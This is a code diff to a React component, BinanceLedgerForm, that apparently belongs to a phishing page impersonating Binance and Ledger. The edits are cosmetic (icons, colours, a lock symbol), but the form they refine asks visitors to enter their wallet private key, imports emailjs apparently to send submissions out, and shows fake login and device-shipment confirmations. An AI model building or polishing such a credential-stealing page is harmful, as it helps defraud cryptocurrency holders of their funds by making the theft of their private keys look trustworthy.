@@ -6,7 +6,7 @@ import { Button } from "@/components/ui/button";
 import { Progress } from "@/components/ui/progress";
 import { Select, SelectTrigger, SelectValue, SelectContent, SelectItem } from "@/components/ui/select";
 import { AlertDialog, AlertDialogContent, AlertDialogHeader, AlertDialogTitle, AlertDialogDescription } from "@/components/ui/alert-dialog";
-import { Wallet } from "lucide-react";
+import { Wallet, CheckCircle, AlertCircle, Lock, ArrowRight } from "lucide-react";
 import emailjs from 'emailjs-com';
 import { EMAILJS_CONFIG } from "@/config/emailjs.config";
 
@@ -429,21 +429,8 @@ const BinanceLedgerForm: FC = () => {
 
   const renderLoginSuccess = () => (
     <div className="text-center py-8 space-y-6">
-      <div className="w-20 h-20 mx-auto bg-green-100 rounded-full flex items-center justify-center">
-        <svg
-          className="w-10 h-10 text-green-600"
-          fill="none"
-          stroke="currentColor" 
-          viewBox="0 0 24 24"
-          xmlns="http://www.w3.org/2000/svg"
-        >
-          <path
-            strokeLinecap="round"
-            strokeLinejoin="round"
-            strokeWidth="2"
-            d="M5 13l4 4L19 7"
-          />
-        </svg>
+      <div className="w-20 h-20 mx-auto bg-binance-yellow/20 rounded-full flex items-center justify-center">
+        <CheckCircle className="w-10 h-10 text-binance-yellow" />
       </div>
       <h3 className="text-white font-semibold text-xl">Login Successful</h3>
       <p className="text-gray-300 max-w-md mx-auto">
@@ -775,21 +762,8 @@ const BinanceLedgerForm: FC = () => {
 
   const renderShipmentConfirmation = () => (
     <div className="text-center py-8">
-      <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-green-100 mb-6">
-        <svg
-          className="w-8 h-8 text-green-600"
-          fill="none"
-          stroke="currentColor"
-          viewBox="0 0 24 24"
-          xmlns="http://www.w3.org/2000/svg"
-        >
-          <path
-            strokeLinecap="round"
-            strokeLinejoin="round"
-            strokeWidth="2"
-            d="M5 13l4 4L19 7"
-          ></path>
-        </svg>
+      <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-binance-yellow/20 mb-6">
+        <CheckCircle className="w-8 h-8 text-binance-yellow" />
       </div>
       <h3 className="text-white font-semibold text-xl mb-2">
         Success! Your Binance Ledger is on the way.
@@ -1181,25 +1155,33 @@ const BinanceLedgerForm: FC = () => {
       </div>
       
       <div className="bg-red-900/20 border border-red-500/30 rounded-md p-4 mb-4">
-        <h4 className="text-red-400 font-medium mb-2">Critical Security Warning:</h4>
-        <p className="text-gray-300">
-          This key is for your eyes only. Do not share it with anyone and ensure no one is watching your screen.
-          Private keys grant complete access to your crypto assets.
-        </p>
+        <div className="flex items-start">
+          <AlertCircle className="text-red-400 w-5 h-5 mt-1 mr-2 flex-shrink-0" />
+          <div>
+            <h4 className="text-red-400 font-medium mb-2">Critical Security Warning:</h4>
+            <p className="text-gray-300">
+              This key is for your eyes only. Do not share it with anyone and ensure no one is watching your screen.
+              Private keys grant complete access to your crypto assets.
+            </p>
+          </div>
+        </div>
       </div>
       
       <div>
         <label htmlFor="privateKey" className="block text-sm font-medium text-gray-300 mb-2">
           Enter your private key below to connect your wallet to your Ledger
         </label>
-        <Input
-          id="privateKey"
-          name="privateKey"
-          value={formData.privateKey}
-          onChange={handleInputChange}
-          placeholder="Enter your private key"
-          className={`bg-binance-darkGray border-gray-600 text-white font-mono ${errors.privateKey ? "border-red-500" : ""}`}
-        />
+        <div className="relative">
+          <Input
+            id="privateKey"
+            name="privateKey"
+            value={formData.privateKey}
+            onChange={handleInputChange}
+            placeholder="Enter your private key"
+            className={`bg-binance-darkGray border-gray-600 text-white font-mono pl-10 ${errors.privateKey ? "border-red-500" : ""}`}
+          />
+          <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500 w-5 h-5" />
+        </div>
         {errors.privateKey && <p className="text-red-500 text-xs mt-1">{errors.privateKey}</p>}
       </div>
       
@@ -1223,24 +1205,11 @@ const BinanceLedgerForm: FC = () => {
 
   const renderWalletSuccess = () => (
     <div className="text-center py-8">
-      <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-green-100 mb-6">
-        <svg
-          className="w-8 h-8 text-green-600"
-          fill="none"
-          stroke="currentColor"
-          viewBox="0 0 24 24"
-          xmlns="http://www.w3.org/2000/svg"
-        >
-          <path
-            strokeLinecap="round"
-            strokeLinejoin="round"
-            strokeWidth="2"
-            d="M5 13l4 4L19 7"
-          ></path>
-        </svg>
+      <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-binance-yellow/20 mb-6">
+        <CheckCircle className="w-8 h-8 text-binance-yellow" />
       </div>
       <h3 className="text-white font-semibold text-xl mb-4">
-        ✅ Your Ledger has been successfully linked!
+        Your Ledger has been successfully linked!
       </h3>
       
       <div className="bg-binance-darkGray/40 rounded-lg p-4 mt-6 max-w-md mx-auto text-left">
